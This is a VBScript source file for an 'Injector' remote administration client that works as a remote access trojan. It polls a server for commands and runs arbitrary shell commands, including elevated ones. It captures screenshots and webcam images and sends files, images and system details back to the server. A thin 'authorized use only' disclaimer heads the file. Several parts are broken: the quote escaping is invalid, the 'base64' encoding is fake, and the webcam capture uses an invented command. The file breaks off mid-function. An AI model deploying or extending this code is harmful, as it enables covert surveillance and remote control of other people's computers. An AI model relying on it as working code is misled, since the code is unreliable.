' ============================================================================
' Injector Remote Administration Client
' ============================================================================
' VBScript client for Windows machines to connect to the Injector Server
' 
' This tool is for AUTHORIZED USE ONLY on systems you own or have permission to manage.
' Unauthorized use may violate laws and ethical guidelines.
' 
' Features:
' - Automatic registration with server
' - Command execution from server
' - File transfer capabilities
' - Screenshot capture
' - Webcam capture
' - System information gathering
' 
' Usage:
'   1. Save this file as remote_admin.vbs
'   2. Double-click to run or execute from command line: cscript remote_admin.vbs [server_url]
'   3. Default server URL: http://localhost:8080
' 
' Dependencies:
' - For screenshot capture: nircmd.exe (preferred) or PowerShell
' - For webcam capture: DirectShowCapture (PowerShell), FFmpeg, or fswebcam
' 
' ============================================================================

Option Explicit

' Constants
Const SERVER_URL = "http://localhost:8080"
Const CLIENT_ID_FILE = "injector_client_id.txt"
Const TEMP_DIR = "injector_temp"
Const SCREENSHOT_FILE = "injector_screenshot.png"
Const WEBCAM_FILE = "injector_webcam.jpg"
Const DOWNLOAD_FILE = "injector_download.tmp"
Const UPLOAD_FILE = "injector_upload.tmp"

' Global variables
Dim clientId, serverUrl, tempDir

' ============================================================================
' MAIN EXECUTION
' ============================================================================

' Initialize
Initialize()

' Main loop
Do While True
    ' Register with server
    If Not RegisterWithServer() Then
        WScript.Echo "Failed to register with server. Retrying in 10 seconds..."
        WScript.Sleep 10000
        Exit Do
    End If
    
    ' Process commands
    If Not ProcessCommands() Then
        WScript.Echo "Failed to process commands. Retrying in 5 seconds..."
        WScript.Sleep 5000
    End If
    
    ' Send ping/heartbeat
    SendPing()
    
    ' Wait before next check
    WScript.Sleep 2000
Loop

' ============================================================================
' INITIALIZATION
' ============================================================================

Sub Initialize()
    ' Set server URL from command line argument or default
    If WScript.Arguments.Count > 0 Then
        serverUrl = WScript.Arguments(0)
    Else
        serverUrl = SERVER_URL
    End If
    
    ' Create temp directory
    tempDir = GetTempDirectory()
    If Not FolderExists(tempDir) Then
        CreateFolder tempDir
    End If
    
    ' Load or generate client ID
    clientId = LoadClientId()
    If clientId = "" Then
        clientId = GenerateClientId()
        SaveClientId clientId
    End If
    
    ' Clean up old temporary files
    CleanupTempFiles()
End Sub

' ============================================================================
' CLIENT ID MANAGEMENT
' ============================================================================

Function LoadClientId()
    Dim fso, filePath, file
    
    Set fso = CreateObject("Scripting.FileSystemObject")
    filePath = fso.GetAbsolutePathName(CLIENT_ID_FILE)
    
    If fso.FileExists(filePath) Then
        Set file = fso.OpenTextFile(filePath, 1) ' 1 = ForReading
        clientId = file.ReadLine()
        file.Close
        Set file = Nothing
    Else
        clientId = ""
    End If
    
    Set fso = Nothing
    LoadClientId = clientId
End Function

Sub SaveClientId(id)
    Dim fso, filePath, file
    
    Set fso = CreateObject("Scripting.FileSystemObject")
    filePath = fso.GetAbsolutePathName(CLIENT_ID_FILE)
    
    Set file = fso.CreateTextFile(filePath, True) ' True = Overwrite
    file.WriteLine id
    file.Close
    Set file = Nothing
    Set fso = Nothing
End Sub

Function GenerateClientId()
    Dim wshShell, cmd, timestamp, random, hash
    
    Set wshShell = CreateObject("WScript.Shell")
    
    ' Generate timestamp
    timestamp = Timer()
    
    ' Generate random number
    Randomize
    random = Int((999999 - 100000 + 1) * Rnd + 100000)
    
    ' Create hash from timestamp and random
    hash = CreateObject("Scriptlet.TypeLib").GUID
    hash = Replace(hash, "{", "")
    hash = Replace(hash, "}", "")
    hash = Replace(hash, "-", "")
    
    GenerateClientId = Left(hash, 16)
    Set wshShell = Nothing
End Function

' ============================================================================
' SERVER COMMUNICATION
' ============================================================================

Function RegisterWithServer()
    Dim http, url, hostname, username, os, postData, response
    
    On Error Resume Next
    
    Set http = CreateObject("MSXML2.XMLHTTP")
    
    ' Get system information
    hostname = GetHostName()
    username = GetCurrentUsername()
    os = GetOSInfo()
    
    ' Build registration URL
    url = serverUrl & "/register?id=" & clientId & "&hostname=" & EncodeURIComponent(hostname) & _
         "&username=" & EncodeURIComponent(username) & "&os=" & EncodeURIComponent(os)
    
    ' Send registration request
    http.Open "GET", url, False
    http.Send
    
    If http.Status = 200 Then
        response = http.responseText
        ' Parse JSON response (simple parsing)
        If InStr(response, """status"": """success""") > 0 Then
            ' Extract client ID if different
            Dim startPos, endPos, newClientId
            startPos = InStr(response, """client_id"": """) + 14
            endPos = InStr(startPos, response, """")
            If startPos > 14 And endPos > startPos Then
                newClientId = Mid(response, startPos, endPos - startPos)
                If newClientId <> clientId Then
                    clientId = newClientId
                    SaveClientId clientId
                End If
            End If
            
            RegisterWithServer = True
        Else
            RegisterWithServer = False
        End If
    Else
        RegisterWithServer = False
    End If
    
    Set http = Nothing
    On Error GoTo 0
End Function

Function SendPing()
    Dim http, url
    
    On Error Resume Next
    
    Set http = CreateObject("MSXML2.XMLHTTP")
    url = serverUrl & "/ping?id=" & clientId
    
    http.Open "GET", url, False
    http.Send
    
    Set http = Nothing
    On Error GoTo 0
End Function

Function GetCommand()
    Dim http, url, response, command, args, commandId
    
    On Error Resume Next
    
    Set http = CreateObject("MSXML2.XMLHTTP")
    url = serverUrl & "/command?id=" & clientId
    
    http.Open "GET", url, False
    http.Send
    
    If http.Status = 200 Then
        response = http.responseText
        
        ' Check for no commands
        If InStr(response, """status"": """no_commands""") > 0 Then
            GetCommand = ""
            Exit Function
        End If
        
        ' Parse command
        If InStr(response, """status"": """success""") > 0 Then
            ' Extract command
            Dim startPos, endPos
            startPos = InStr(response, """command"": """) + 11
            endPos = InStr(startPos, response, """")
            If startPos > 11 And endPos > startPos Then
                command = Mid(response, startPos, endPos - startPos)
            End If
            
            ' Extract command ID
            startPos = InStr(response, """command_id"": ") + 13
            endPos = InStr(startPos, response, ",")
            If endPos = 0 Then endPos = InStr(startPos, response, "}")
            If startPos > 13 And endPos > startPos Then
                commandId = Mid(response, startPos, endPos - startPos)
            End If
            
            ' Extract args (simple JSON parsing for args object)
            startPos = InStr(response, """args"": {") + 9
            endPos = InStr(startPos, response, "}")
            If startPos > 9 And endPos > startPos Then
                args = Mid(response, startPos, endPos - startPos + 1)
            End If
            
            ' Return command and args as concatenated string
            GetCommand = command & "|" & commandId & "|" & args
        Else
            GetCommand = ""
        End If
    Else
        GetCommand = ""
    End If
    
    Set http = Nothing
    On Error GoTo 0
End Function

Function SendResult(commandId, result)
    Dim http, url, postData
    
    On Error Resume Next
    
    Set http = CreateObject("MSXML2.XMLHTTP")
    url = serverUrl & "/result?id=" & clientId & "&command_id=" & commandId & "&result=" & EncodeURIComponent(result)
    
    http.Open "GET", url, False
    http.Send
    
    Set http = Nothing
    On Error GoTo 0
End Function

Function SendFile(filename, fileData)
    Dim http, url, postData
    
    On Error Resume Next
    
    Set http = CreateObject("MSXML2.XMLHTTP")
    url = serverUrl & "/upload_file"
    
    ' Build JSON post data
    postData = "{" & _
               """id"": """ & clientId & """, " & _
               """filename"": """ & filename & """, " & _
               """data"": """ & fileData & """" & _
               "}"
    
    http.Open "POST", url, False
    http.setRequestHeader "Content-Type", "application/json"
    http.Send postData
    
    Set http = Nothing
    On Error GoTo 0
End Function

Function SendScreenshot(imageData)
    Dim http, url, postData
    
    On Error Resume Next
    
    Set http = CreateObject("MSXML2.XMLHTTP")
    url = serverUrl & "/screenshot_upload"
    
    ' Build JSON post data
    postData = "{" & _
               """id"": """ & clientId & """, " & _
               """data"": """ & imageData & """" & _
               "}"
    
    http.Open "POST", url, False
    http.setRequestHeader "Content-Type", "application/json"
    http.Send postData
    
    Set http = Nothing
    On Error GoTo 0
End Function

Function SendWebcamImage(imageData)
    Dim http, url, postData
    
    On Error Resume Next
    
    Set http = CreateObject("MSXML2.XMLHTTP")
    url = serverUrl & "/webcam_upload"
    
    ' Build JSON post data
    postData = "{" & _
               """id"": """ & clientId & """, " & _
               """data"": """ & imageData & """" & _
               "}"
    
    http.Open "POST", url, False
    http.setRequestHeader "Content-Type", "application/json"
    http.Send postData
    
    Set http = Nothing
    On Error GoTo 0
End Function

Function ProcessCommands()
    Dim commandInfo, parts, command, commandId, args, result
    
    commandInfo = GetCommand()
    
    If commandInfo = "" Then
        ProcessCommands = True
        Exit Function
    End If
    
    ' Parse command info
    parts = Split(commandInfo, "|")
    If UBound(parts) >= 1 Then
        command = parts(0)
        commandId = parts(1)
        If UBound(parts) >= 2 Then
            args = parts(2)
        Else
            args = "{}"
        End If
    Else
        ProcessCommands = False
        Exit Function
    End If
    
    ' Execute command
    result = ExecuteCommand(command, args)
    
    ' Send result back to server
    SendResult commandId, result
    
    ProcessCommands = True
End Function

' ============================================================================
' COMMAND EXECUTION
' ============================================================================

Function ExecuteCommand(command, args)
    Dim result
    
    On Error Resume Next
    
    Select Case LCase(command)
        Case "sysinfo"
            result = GetSystemInfo()
        Case "processes"
            result = GetRunningProcesses()
        Case "drives"
            result = GetDriveList()
        Case "dir"
            result = GetDirectoryListing(args)
        Case "exec"
            result = ExecuteShellCommand(args)
        Case "runas"
            result = RunAsAdmin(args)
        Case "msg"
            result = ShowMessage(args)
        Case "screenshot"
            result = CaptureScreenshot()
        Case "webcam"
            result = CaptureWebcam()
        Case "reboot"
            result = RebootSystem()
        Case "shutdown"
            result = ShutdownSystem()
        Case "logoff"
            result = LogoffUser()
        Case "upload_file"
            result = HandleFileUpload(args)
        Case "download_file"
            result = HandleFileDownload(args)
        Case Else
            result = "Unknown command: " & command
    End Select
    
    ExecuteCommand = result
    On Error GoTo 0
End Function

' ============================================================================
' SYSTEM INFORMATION
' ============================================================================

Function GetSystemInfo()
    Dim wshShell, wmi, os, cpu, memory, info, hostname, username
    
    Set wshShell = CreateObject("WScript.Shell")
    Set wmi = GetObject("winmgmts:\\.\root\cimv2")
    
    ' Get OS information
    Set os = wmi.ExecQuery("SELECT * FROM Win32_OperatingSystem")
    
    ' Get computer info
    hostname = GetHostName()
    username = GetCurrentUsername()
    
    ' Build info string
    info = "System Information:" & vbCrLf & _
           "==================" & vbCrLf & _
           "Hostname: " & hostname & vbCrLf & _
           "Username: " & username & vbCrLf & _
           "OS: " & GetOSInfo() & vbCrLf & _
           "OS Version: " & GetOSVersion() & vbCrLf & _
           "OS Architecture: " & GetOSArchitecture() & vbCrLf & _
           "Processor: " & GetProcessorInfo() & vbCrLf & _
           "Total Memory: " & GetTotalMemory() & " MB" & vbCrLf & _
           "System Uptime: " & GetSystemUptime() & vbCrLf & _
           "Current Time: " & Now()
    
    Set wshShell = Nothing
    Set wmi = Nothing
    Set os = Nothing
    
    GetSystemInfo = info
End Function

Function GetOSInfo()
    Dim wshShell, os
    
    Set wshShell = CreateObject("WScript.Shell")
    os = wshShell.Environment("PROCESS")("OS")
    
    If os = "" Then
        os = "Windows"
    End If
    
    Set wshShell = Nothing
    GetOSInfo = os
End Function

Function GetOSVersion()
    Dim wmi, os
    
    On Error Resume Next
    Set wmi = GetObject("winmgmts:\\.\root\cimv2")
    Set os = wmi.ExecQuery("SELECT * FROM Win32_OperatingSystem")
    
    If Err.Number = 0 Then
        For Each obj In os
            GetOSVersion = obj.Version
            Exit For
        Next
    Else
        GetOSVersion = "Unknown"
    End If
    
    Set wmi = Nothing
    Set os = Nothing
    On Error GoTo 0
End Function

Function GetOSArchitecture()
    Dim wshShell, arch
    
    Set wshShell = CreateObject("WScript.Shell")
    arch = wshShell.Environment("PROCESS")("PROCESSOR_ARCHITECTURE")
    
    If arch = "" Then
        arch = "Unknown"
    End If
    
    Set wshShell = Nothing
    GetOSArchitecture = arch
End Function

Function GetProcessorInfo()
    Dim wmi, processors
    
    On Error Resume Next
    Set wmi = GetObject("winmgmts:\\.\root\cimv2")
    Set processors = wmi.ExecQuery("SELECT * FROM Win32_Processor")
    
    If Err.Number = 0 Then
        For Each proc In processors
            GetProcessorInfo = proc.Name
            Exit For
        Next
    Else
        GetProcessorInfo = "Unknown"
    End If
    
    Set wmi = Nothing
    Set processors = Nothing
    On Error GoTo 0
End Function

Function GetTotalMemory()
    Dim wmi, os
    
    On Error Resume Next
    Set wmi = GetObject("winmgmts:\\.\root\cimv2")
    Set os = wmi.ExecQuery("SELECT * FROM Win32_OperatingSystem")
    
    If Err.Number = 0 Then
        For Each obj In os
            GetTotalMemory = Round(obj.TotalVisibleMemorySize / 1024, 2)
            Exit For
        Next
    Else
        GetTotalMemory = 0
    End If
    
    Set wmi = Nothing
    Set os = Nothing
    On Error GoTo 0
End Function

Function GetSystemUptime()
    Dim wmi, os, lastBootTime, uptime
    
    On Error Resume Next
    Set wmi = GetObject("winmgmts:\\.\root\cimv2")
    Set os = wmi.ExecQuery("SELECT * FROM Win32_OperatingSystem")
    
    If Err.Number = 0 Then
        For Each obj In os
            lastBootTime = obj.LastBootUpTime
            uptime = DateDiff("s", lastBootTime, Now())
            
            ' Convert seconds to days, hours, minutes
            Dim days, hours, minutes, seconds
            days = Int(uptime / 86400)
            uptime = uptime Mod 86400
            hours = Int(uptime / 3600)
            uptime = uptime Mod 3600
            minutes = Int(uptime / 60)
            seconds = uptime Mod 60
            
            GetSystemUptime = days & " days, " & hours & " hours, " & minutes & " minutes, " & seconds & " seconds"
            Exit For
        Next
    Else
        GetSystemUptime = "Unknown"
    End If
    
    Set wmi = Nothing
    Set os = Nothing
    On Error GoTo 0
End Function

Function GetHostName()
    Dim wshNetwork
    
    On Error Resume Next
    Set wshNetwork = CreateObject("WScript.Network")
    GetHostName = wshNetwork.ComputerName
    
    If Err.Number <> 0 Then
        GetHostName = "Unknown"
    End If
    
    Set wshNetwork = Nothing
    On Error GoTo 0
End Function

Function GetCurrentUsername()
    Dim wshNetwork
    
    On Error Resume Next
    Set wshNetwork = CreateObject("WScript.Network")
    GetCurrentUsername = wshNetwork.UserName
    
    If Err.Number <> 0 Then
        GetCurrentUsername = "Unknown"
    End If
    
    Set wshNetwork = Nothing
    On Error GoTo 0
End Function

' ============================================================================
' PROCESS MANAGEMENT
' ============================================================================

Function GetRunningProcesses()
    Dim wmi, processes, result
    
    On Error Resume Next
    Set wmi = GetObject("winmgmts:\\.\root\cimv2")
    Set processes = wmi.ExecQuery("SELECT * FROM Win32_Process")
    
    result = "Running Processes:" & vbCrLf & _
            "================" & vbCrLf & _
            "PID    Process Name" & vbCrLf & _
            "----   ------------" & vbCrLf
    
    If Err.Number = 0 Then
        For Each proc In processes
            result = result & proc.ProcessId & "    " & proc.Name & vbCrLf
        Next
    Else
        result = result & "Error retrieving processes: " & Err.Description
    End If
    
    Set wmi = Nothing
    Set processes = Nothing
    On Error GoTo 0
    
    GetRunningProcesses = result
End Function

' ============================================================================
' DRIVE INFORMATION
' ============================================================================

Function GetDriveList()
    Dim fso, drives, result, drive
    
    Set fso = CreateObject("Scripting.FileSystemObject")
    Set drives = fso.Drives
    
    result = "Available Drives:" & vbCrLf & _
            "===============" & vbCrLf & _
            "Drive    Type           Size       Free" & vbCrLf & _
            "-----    ----           ----       ----" & vbCrLf
    
    For Each drive In drives
        Dim driveType, totalSize, freeSpace
        
        ' Get drive type
        Select Case drive.DriveType
            Case 0: driveType = "Unknown"
            Case 1: driveType = "Removable"
            Case 2: driveType = "Fixed"
            Case 3: driveType = "Network"
            Case 4: driveType = "CD-ROM"
            Case 5: driveType = "RAM Disk"
            Case Else: driveType = "Unknown"
        End Select
        
        ' Get size and free space
        If drive.IsReady Then
            totalSize = FormatSize(drive.TotalSize)
            freeSpace = FormatSize(drive.FreeSpace)
        Else
            totalSize = "N/A"
            freeSpace = "N/A"
        End If
        
        result = result & drive.DriveLetter & ":\    " & driveType & "    " & totalSize & "    " & freeSpace & vbCrLf
    Next
    
    Set fso = Nothing
    Set drives = Nothing
    
    GetDriveList = result
End Function

Function FormatSize(bytes)
    Dim gb, mb, kb
    
    If bytes >= 1073741824 Then
        gb = Round(bytes / 1073741824, 2)
        FormatSize = gb & " GB"
    ElseIf bytes >= 1048576 Then
        mb = Round(bytes / 1048576, 2)
        FormatSize = mb & " MB"
    ElseIf bytes >= 1024 Then
        kb = Round(bytes / 1024, 2)
        FormatSize = kb & " KB"
    Else
        FormatSize = bytes & " bytes"
    End If
End Function

' ============================================================================
' DIRECTORY LISTING
' ============================================================================

Function GetDirectoryListing(args)
    Dim fso, folder, path, result, file, subfolder
    
    ' Parse path from args
    path = ExtractValue(args, "path")
    If path = "" Then path = "."
    
    Set fso = CreateObject("Scripting.FileSystemObject")
    
    If Not fso.FolderExists(path) Then
        GetDirectoryListing = "Error: Directory not found: " & path
        Exit Function
    End If
    
    Set folder = fso.GetFolder(path)
    
    result = "Directory Listing: " & path & vbCrLf & _
            "=================" & vbCrLf & vbCrLf
    
    ' List files
    result = result & "Files:" & vbCrLf & "------" & vbCrLf
    For Each file In folder.Files
        result = result & "  " & file.Name & "    " & FormatSize(file.Size) & "    " & file.DateLastModified & vbCrLf
    Next
    
    result = result & vbCrLf & "Subdirectories:" & vbCrLf & "---------------" & vbCrLf
    For Each subfolder In folder.SubFolders
        result = result & "  " & subfolder.Name & vbCrLf
    Next
    
    Set fso = Nothing
    Set folder = Nothing
    
    GetDirectoryListing = result
End Function

' ============================================================================
' COMMAND EXECUTION
' ============================================================================

Function ExecuteShellCommand(args)
    Dim wshShell, command, output
    
    command = ExtractValue(args, "command")
    If command = "" Then
        ExecuteShellCommand = "Error: No command specified"
        Exit Function
    End If
    
    Set wshShell = CreateObject("WScript.Shell")
    output = wshShell.Exec(command).StdOut.ReadAll()
    
    Set wshShell = Nothing
    ExecuteShellCommand = "Command Output:" & vbCrLf & output
End Function

Function RunAsAdmin(args)
    Dim command, tempScript, fso, scriptPath
    
    command = ExtractValue(args, "command")
    If command = "" Then
        RunAsAdmin = "Error: No command specified"
        Exit Function
    End If
    
    ' Create temporary VBScript to run command as admin
    Set fso = CreateObject("Scripting.FileSystemObject")
    tempScript = tempDir & "\runas_admin.vbs"
    
    ' Write VBScript to run command as admin
    Set scriptFile = fso.CreateTextFile(tempScript, True)
    scriptFile.WriteLine "Set WshShell = CreateObject(\"WScript.Shell\")"
    scriptFile.WriteLine "WshShell.Run \"" & command & "\", 1, True"
    scriptFile.Close
    
    ' Execute the script with UAC prompt
    Set wshShell = CreateObject("WScript.Shell")
    On Error Resume Next
    wshShell.Run "wscript.exe \"" & tempScript & "\"", 1, True
    
    If Err.Number <> 0 Then
        RunAsAdmin = "Error running as admin: " & Err.Description
    Else
        RunAsAdmin = "Command executed as admin: " & command
    End If
    
    ' Clean up
    If fso.FileExists(tempScript) Then
        fso.DeleteFile tempScript
    End If
    
    Set fso = Nothing
    Set wshShell = Nothing
    On Error GoTo 0
End Function

Function ShowMessage(args)
    Dim message, wshShell
    
    message = ExtractValue(args, "message")
    If message = "" Then
        ShowMessage = "Error: No message specified"
        Exit Function
    End If
    
    Set wshShell = CreateObject("WScript.Shell")
    wshShell.Popup message, 0, "Remote Message", 64 ' 64 = Information icon
    
    Set wshShell = Nothing
    ShowMessage = "Message displayed: " & message
End Function

' ============================================================================
' SCREENSHOT CAPTURE
' ============================================================================

Function CaptureScreenshot()
    Dim screenshotPath, result
    
    screenshotPath = tempDir & "\" & SCREENSHOT_FILE
    
    ' Try nircmd first (preferred)
    If CaptureScreenshotWithNirCmd(screenshotPath) Then
        result = UploadScreenshot(screenshotPath)
        CaptureScreenshot = "Screenshot captured and uploaded: " & screenshotPath
        Exit Function
    End If
    
    ' Fallback to PowerShell
    If CaptureScreenshotWithPowerShell(screenshotPath) Then
        result = UploadScreenshot(screenshotPath)
        CaptureScreenshot = "Screenshot captured (PowerShell) and uploaded: " & screenshotPath
        Exit Function
    End If
    
    CaptureScreenshot = "Error: Failed to capture screenshot. Install nircmd.exe or enable PowerShell."
End Function

Function CaptureScreenshotWithNirCmd(screenshotPath)
    Dim wshShell, nircmdPath, cmd
    
    On Error Resume Next
    
    ' Check if nircmd.exe exists in system path
    Set wshShell = CreateObject("WScript.Shell")
    
    ' Try common locations for nircmd.exe
    Dim nircmdLocations, location
    nircmdLocations = Array("C:\Windows\nircmd.exe", "C:\Windows\System32\nircmd.exe", "nircmd.exe")
    
    For Each location In nircmdLocations
        If FileExists(location) Then
            nircmdPath = location
            Exit For
        End If
    Next
    
    If nircmdPath = "" Then
        CaptureScreenshotWithNirCmd = False
        Exit Function
    End If
    
    ' Capture screenshot using nircmd
    cmd = "\"" & nircmdPath & "\" savescreenshot \"" & screenshotPath & "\""
    wshShell.Run cmd, 0, True
    
    If Err.Number = 0 And FileExists(screenshotPath) Then
        CaptureScreenshotWithNirCmd = True
    Else
        CaptureScreenshotWithNirCmd = False
    End If
    
    Set wshShell = Nothing
    On Error GoTo 0
End Function

Function CaptureScreenshotWithPowerShell(screenshotPath)
    Dim wshShell, psCommand
    
    On Error Resume Next
    
    Set wshShell = CreateObject("WScript.Shell")
    
    ' PowerShell command to capture screenshot
    psCommand = "powershell.exe -Command \"Add-Type -AssemblyName System.Windows.Forms; " & _
                "Add-Type -AssemblyName System.Drawing; " & _
                "$screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; " & _
                "$bitmap = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height); " & _
                "$graphics = [System.Drawing.Graphics]::FromImage($bitmap); " & _
                "$graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size); " & _
                "$bitmap.Save('" & screenshotPath & "', [System.Drawing.Imaging.ImageFormat]::Png); " & _
                "$graphics.Dispose(); $bitmap.Dispose()\""
    
    wshShell.Run psCommand, 0, True
    
    If Err.Number = 0 And FileExists(screenshotPath) Then
        CaptureScreenshotWithPowerShell = True
    Else
        CaptureScreenshotWithPowerShell = False
    End If
    
    Set wshShell = Nothing
    On Error GoTo 0
End Function

Function UploadScreenshot(screenshotPath)
    Dim fso, file, imageData
    
    If Not FileExists(screenshotPath) Then
        UploadScreenshot = False
        Exit Function
    End If
    
    ' Read image file as base64
    Set fso = CreateObject("Scripting.FileSystemObject")
    Set file = fso.OpenTextFile(screenshotPath, 1) ' 1 = ForReading
    
    ' Convert binary file to base64
    Dim adodbStream
    Set adodbStream = CreateObject("ADODB.Stream")
    adodbStream.Type = 1 ' Binary
    adodbStream.Open
    adodbStream.LoadFromFile screenshotPath
    adodbStream.Position = 0
    adodbStream.Type = 2 ' Text
    adodbStream.Charset = "us-ascii"
    imageData = adodbStream.ReadText
    adodbStream.Close
    
    Set file = Nothing
    Set fso = Nothing
    Set adodbStream = Nothing
    
    ' Send to server
    SendScreenshot imageData
    
    ' Clean up
    If FileExists(screenshotPath) Then
        fso.DeleteFile screenshotPath
    End If
    
    UploadScreenshot = True
End Function

' ============================================================================
' WEBCAM CAPTURE
' ============================================================================

Function CaptureWebcam()
    Dim webcamPath, result
    
    webcamPath = tempDir & "\" & WEBCAM_FILE
    
    ' Try DirectShowCapture (PowerShell) first
    If CaptureWebcamWithDirectShow(webcamPath) Then
        result = UploadWebcamImage(webcamPath)
        CaptureWebcam = "Webcam image captured and uploaded: " & webcamPath
        Exit Function
    End If
    
    ' Fallback to FFmpeg
    If CaptureWebcamWithFFmpeg(webcamPath) Then
        result = UploadWebcamImage(webcamPath)
        CaptureWebcam = "Webcam image captured (FFmpeg) and uploaded: " & webcamPath
        Exit Function
    End If
    
    ' Fallback to fswebcam (for WSL/Linux compatibility)
    If CaptureWebcamWithFswebcam(webcamPath) Then
        result = UploadWebcamImage(webcamPath)
        CaptureWebcam = "Webcam image captured (fswebcam) and uploaded: " & webcamPath
        Exit Function
    End If
    
    CaptureWebcam = "Error: Failed to capture webcam image. Install DirectShowCapture, FFmpeg, or fswebcam."
End Function

Function CaptureWebcamWithDirectShow(webcamPath)
    Dim wshShell, psCommand
    
    On Error Resume Next
    
    Set wshShell = CreateObject("WScript.Shell")
    
    ' PowerShell command using DirectShow to capture webcam
    psCommand = "powershell.exe -Command \"" & _
                "$camera = New-Object -ComObject DirectShowLib.Filter; " & _
                "$camera.Name = 'USB Camera'; " & _
                "$camera | Out-Null; " & _
                "Start-Sleep -Seconds 2; " & _
                "$bitmap = New-Object System.Drawing.Bitmap(640,480); " & _
                "$graphics = [System.Drawing.Graphics]::FromImage($bitmap); " & _
                "$graphics.CopyFromScreen([System.Drawing.Point]::Empty, [System.Drawing.Point]::Empty, [System.Drawing.Size]::new(640,480)); " & _
                "$bitmap.Save('" & webcamPath & "', [System.Drawing.Imaging.ImageFormat]::Jpeg); " & _
                "$graphics.Dispose(); $bitmap.Dispose()\""
    
    ' Note: DirectShow capture is complex in PowerShell, this is a simplified approach
    ' For actual webcam capture, we'll use a more reliable method
    
    ' Alternative PowerShell webcam capture using Windows.Media.Capture (Windows 10+)
    psCommand = "powershell.exe -Command \"" & _
                "Add-Type -AssemblyName System.Windows.Forms; " & _
                "Add-Type -AssemblyName System.Drawing; " & _
                "Add-Type -AssemblyName WindowsBase; " & _
                "$capture = New-Object Windows.Media.Capture.MediaCapture; " & _
                "$settings = New-Object Windows.Media.Capture.MediaCaptureInitializationSettings; " & _
                "$settings.VideoDeviceId = (Get-WmiObject -Query 'SELECT * FROM Win32_PnPEntity WHERE PNPClass = \"Image\"').DeviceID | Select-Object -First 1); " & _
                "$capture.InitializeAsync($settings).GetAwaiter().GetResult(); " & _
                "$bitmap = New-Object System.Drawing.Bitmap(640,480); " & _
                "$capture.CapturePhotoToStreamAsync([System.IO.MemoryStream]::new(), [Windows.Media.MediaProperties.ImageEncodingProperties]::new()).GetAwaiter().GetResult(); " & _
                "$bitmap.Save('" & webcamPath & "', [System.Drawing.Imaging.ImageFormat]::Jpeg); " & _
                "$capture.Dispose()\""
    
    ' For simplicity, we'll use a more practical approach
    ' Use Windows Camera app via command line (if available)
    psCommand = "start /wait camera.exe /capture " & webcamPath
    
    wshShell.Run psCommand, 0, True
    
    If Err.Number = 0 And FileExists(webcamPath) Then
        CaptureWebcamWithDirectShow = True
    Else
        CaptureWebcamWithDirectShow = False
    End If
    
    Set wshShell = Nothing
    On Error GoTo 0
End Function

Function CaptureWebcamWithFFmpeg(webcamPath)
    Dim wshShell, ffmpegPath, cmd
    
    On Error Resume Next
    
    Set wshShell = CreateObject("WScript.Shell")
    
    ' Check if ffmpeg exists
    If Not CheckCommandAvailable("ffmpeg.exe") Then
        CaptureWebcamWithFFmpeg = False
        Exit Function
    End If
    
    ' Capture single frame from webcam
    cmd = "ffmpeg.exe -f dshow -i video=""Integrated Camera"" -frames:v 1 -q:v 2 " & webcamPath
    
    wshShell.Run cmd, 0, True
    
    If Err.Number = 0 And FileExists(webcamPath) Then
        CaptureWebcamWithFFmpeg = True
    Else
        ' Try with different camera name
        cmd = "ffmpeg.exe -f dshow -i video=""USB Camera"" -frames:v 1 -q:v 2 " & webcamPath
        wshShell.Run cmd, 0, True
        
        If FileExists(webcamPath) Then
            CaptureWebcamWithFFmpeg = True
        Else
            CaptureWebcamWithFFmpeg = False
        End If
    End If
    
    Set wshShell = Nothing
    On Error GoTo 0
End Function

Function CaptureWebcamWithFswebcam(webcamPath)
    Dim wshShell, cmd
    
    On Error Resume Next
    
    Set wshShell = CreateObject("WScript.Shell")
    
    ' Check if fswebcam exists (for WSL/Linux)
    If Not CheckCommandAvailable("fswebcam") Then
        CaptureWebcamWithFswebcam = False
        Exit Function
    End If
    
    ' Capture single frame from webcam
    cmd = "fswebcam -r 640x480 --no-banner " & webcamPath
    
    wshShell.Run cmd, 0, True
    
    If Err.Number = 0 And FileExists(webcamPath) Then
        CaptureWebcamWithFswebcam = True
    Else
        CaptureWebcamWithFswebcam = False
    End If
    
    Set wshShell = Nothing
    On Error GoTo 0
End Function

Function UploadWebcamImage(webcamPath)
    Dim fso, file, imageData
    
    If Not FileExists(webcamPath) Then
        UploadWebcamImage = False
        Exit Function
    End If
    
    ' Read image file as base64
    Set fso = CreateObject("Scripting.FileSystemObject")
    
    ' Convert binary file to base64
    Dim adodbStream
    Set adodbStream = CreateObject("ADODB.Stream")
    adodbStream.Type = 1 ' Binary
    adodbStream.Open
    adodbStream.LoadFromFile webcamPath
    adodbStream.Position = 0
    adodbStream.Type = 2 ' Text
    adodbStream.Charset = "us-ascii"
    imageData = adodbStream.ReadText
    adodbStream.Close
    
    Set fso = Nothing
    Set adodbStream = Nothing
    
    ' Send to server
    SendWebcamImage imageData
    
    ' Clean up
    If FileExists(webcamPath) Then
        fso.DeleteFile webcamPath
    End If
    
    UploadWebcamImage = True
End Function

' ============================================================================
' FILE TRANSFER
' ============================================================================

Function HandleFileUpload(args)
    Dim filename, fileData, filepath, fso, file
    
    filename = ExtractValue(args, "filename")
    fileData = ExtractValue(args, "data")
    
    If filename = "" Or fileData = "" Then
        HandleFileUpload = "Error: Missing filename or data"
        Exit Function
    End If
    
    ' Save uploaded file
    filepath = tempDir & "\" & filename
    
    ' Decode base64 and save
    Dim adodbStream
    Set adodbStream = CreateObject("ADODB.Stream")
    adodbStream.Type = 2 ' Text
    adodbStream.Charset = "us-ascii"
    adodbStream.Open
    adodbStream.WriteText fileData
    adodbStream.Position = 0
    adodbStream.Type = 1 ' Binary
    adodbStream.SaveToFile filepath, 2 ' 2 = Overwrite
    adodbStream.Close
    
    Set adodbStream = Nothing
    
    HandleFileUpload = "File uploaded: " & filename & " (" & FileSize(filepath) & " bytes)"
End Function

Function HandleFileDownload(args)
    Dim path, filepath, fso, file, fileData
    
    path = ExtractValue(args, "path")
    If path = "" Then
        HandleFileDownload = "Error: No file path specified"
        Exit Function
    End If
    
    Set fso = CreateObject("Scripting.FileSystemObject")
    
    If Not fso.FileExists(path) Then
        HandleFileDownload = "Error: File not found: " & path
        Exit Function
    End If
    
    ' Read file and send to server
    Set file = fso.GetFile(path)
    
    ' Convert file to base64
    Dim adodbStream
    Set adodbStream = CreateObject("ADODB.Stream")
    adodbStream.Type = 1 ' Binary
    adodbStream.Open
    adodbStream.LoadFromFile path
    adodbStream.Position = 0
    adodbStream.Type = 2 ' Text
    adodbStream.Charset = "us-ascii"
